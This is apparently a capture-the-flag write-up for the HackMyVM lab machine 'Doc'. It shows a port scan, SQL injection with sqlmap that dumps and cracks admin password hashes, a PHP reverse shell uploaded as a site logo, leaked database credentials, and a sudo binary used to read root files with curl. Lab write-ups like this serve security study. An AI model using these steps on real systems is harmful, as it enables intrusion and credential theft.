---
layout: post
author: kohaku
title:  "Doc"
date:   2021-12-31 09:45:48 AM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Doc)


# Enumeration

{% highlight bash %}
# Nmap 7.92 scan initiated Tue Dec 28 13:14:55 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.166
Nmap scan report for 192.168.0.166
Host is up (0.017s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
|_http-title: Online Traffic Offense Management System - PHP
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 28 13:15:02 2021 -- 1 IP address (1 host up) scanned in 6.97 seconds
{% endhighlight  %}

# Port 80

We need to add `doc.hmv` to our `/etc/hosts` file

## /admin/login.php

![Untitled](/images/doc/burpsuite.png)

Use the option “copy to file” and use this file on `SQLmap` 

{% highlight bash %}
sqlmap -r req.txt --dump --dbs
{% endhighlight  %}

{% highlight bash %}
[13:58:46] [INFO] retrieved: Admin
[13:59:01] [INFO] retrieved: 0192023a7bbd73250516f069df18b500
[14:00:42] [INFO] retrieved: 1
[14:00:44] [INFO] retrieved: adminyo
[14:01:07] [INFO] retrieved: uploads/1629336240_avatar.jpg
[14:02:47] [INFO] retrieved: 2021-08-19 09:24:25
[14:03:57] [INFO] retrieved:  
[14:04:04] [INFO] retrieved: John
[14:04:21] [INFO] retrieved: 9
[14:04:24] [INFO] retrieved:  
[14:04:30] [INFO] retrieved: Smith
[14:04:49] [INFO] retrieved: 1254737c076cf867dc53d60a0364f38e
{% endhighlight  %}

{% highlight bash %}
sqlmap -r req.txt -D doc -T users --dump --dbms=mysql
{% endhighlight  %}

{% highlight bash %}
Admin    | 0192023a7bbd73250516f069df18b500 (admin123)  | adminyo  | Adminstrator
Smith    | 1254737c076cf867dc53d60a0364f38e (jsmith123) | jsmith   | John
{% endhighlight  %}

Log on /admin/login.php with `adminyo | admin123`

## Reverse shell

- Go to settings
- Change the `System logo` to be a php reverse shell

# User

{% highlight bash %}
/var/www/html/traffic_offense/initialize.php
if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"be114yTU");
{% endhighlight  %}

# Root

{% highlight bash %}
sudo -l

User bella may run the following commands on doc:
    (ALL : ALL) NOPASSWD: /usr/bin/doc
{% endhighlight  %}

Start the binary with sudo and open another reverse shell

Use curl on `getfile` directory with `key` parameter. We can access every file on the box

{% highlight bash %}
curl localhost:7890/getfile?key=/root/root.txt
{% endhighlight  %}